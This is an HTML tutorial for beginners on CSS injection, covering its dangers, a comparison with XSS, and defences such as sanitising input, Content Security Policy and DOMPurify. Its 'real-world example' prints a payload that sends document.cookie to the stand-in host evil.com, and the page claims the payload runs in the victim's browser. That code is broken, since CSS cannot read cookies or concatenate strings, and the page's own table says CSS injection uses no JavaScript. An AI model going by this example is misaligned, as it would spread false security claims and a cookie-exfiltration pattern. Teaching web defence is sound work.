<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
</head>
<body>

  <h1>🎨 CSS Injection – Styling Your Way Into Security Flaws</h1>

  <h2>👶 For Beginners: What is CSS Injection?</h2>
  <p>
    CSS Injection is when an attacker injects malicious Cascading Style Sheets (CSS) into a web page to manipulate how it behaves or looks — or even leak data from a user’s browser!
  </p>
  <p>
    💡 Think of it like someone sneaking their own stylesheet into your website and secretly changing colors, layout, or stealing input data.
  </p>

  <h2>⚠️ Why is CSS Injection Dangerous?</h2>
  <p>At first glance, CSS might look harmless — after all, it just styles your webpage, right?</p>
  <p>
    Wrong. When misused, CSS can:
  </p>
  <ul>
    <li>🕵️ Leak sensitive info (like usernames or CSRF tokens)</li>
    <li>🎯 Trick users with fake UI elements</li>
    <li>📄 Modify layout to obscure content or mislead</li>
    <li>💣 Chain with other attacks like HTML Injection or DOM-based XSS</li>
  </ul>

  <h2>💥 Real-World Example: Data Exfiltration via CSS</h2>
  <p>Let’s say a site reflects user input inside a <code>&lt;style&gt;</code> tag:</p>
  <pre><code>&lt;style&gt;
  body { background: {user_input}; }
  &lt;/style&gt;</code></pre>
  <p>
    Now an attacker sends:
  </p>
  <pre><code>body { background: url('https://evil.com/steal?data=' + document.cookie); }</code></pre>
  <p>
    If unfiltered, this executes in the victim’s browser and sends data to the attacker’s domain.
  </p>
  <p>Another sneaky trick: Using <code>:visited</code> selectors to detect which sites you've visited or leaking content from input fields using CSS attribute selectors.</p>

  <h2>🔬 CSS Injection vs XSS</h2>
  <p>🔁 They’re similar, but:</p>
  <table border="1">
    <thead>
      <tr>
        <th>Attack Type</th>
        <th>Executes Scripts?</th>
        <th>Requires JS?</th>
        <th>Can Steal Data?</th>
      </tr>
    </thead>
    <tbody>
      <tr>
        <td>CSS Injection</td>
        <td>❌ (no JS)</td>
        <td>❌</td>
        <td>✅ (in limited ways)</td>
      </tr>
      <tr>
        <td>XSS</td>
        <td>✅</td>
        <td>✅</td>
        <td>✅ (full power)</td>
      </tr>
    </tbody>
  </table>
  <p>💡 CSS Injection is “XSS-lite” — stealthy and still dangerous.</p>

  <h2>🛡️ How to Prevent CSS Injection</h2>

  <h3>✔️ 1. Don’t Reflect Raw Input into &lt;style&gt; Tags</h3>
  <ul>
    <li>✅ Sanitize all user inputs that go into CSS or HTML.</li>
    <li>❌ Avoid rendering user-controlled values directly in stylesheets or style attributes.</li>
  </ul>

  <h3>✔️ 2. Use CSP (Content Security Policy)</h3>
  <ul>
    <li>✅ Implement CSP to prevent inline styles or block external malicious stylesheets.</li>
  </ul>
  <p>Example:</p>
  <pre><code>Content-Security-Policy: style-src 'self';</code></pre>

  <h3>✔️ 3. Escape User Input Properly</h3>
  <ul>
    <li>✅ Use escaping functions that encode special characters (&lt;, {, }, ;, etc.)</li>
    <li>✅ For templates, use secure templating engines that auto-escape</li>
  </ul>

  <h3>✔️ 4. Sanitize HTML Inputs</h3>
  <ul>
    <li>✅ If user-generated content includes style-related HTML (e.g., WYSIWYG editors), use sanitizers like DOMPurify</li>
    <li>✅ Remove dangerous attributes like style, onload, or background</li>
  </ul>

  <h3>✔️ 5. Audit Reflected Content</h3>
  <ul>
    <li>✅ Run static code analysis and manual testing to catch places where input is reflected into styles</li>
    <li>✅ Use tools like Burp Suite, ZAP, and browser DevTools</li>
  </ul>

  <h2>🚀 Final Thoughts</h2>
  <p>
    CSS Injection may not have the power of full XSS, but it can still lead to UI manipulation, data leakage, and privacy invasion — especially in modern apps where styles affect behavior.
  </p>
  <p>
    🖌️ CSS is not just decoration — in the wrong hands, it's a data exfiltration weapon.
  </p>

  <h3>🔐 Style Secure. Code Safer.</h3>

</body>
</html>
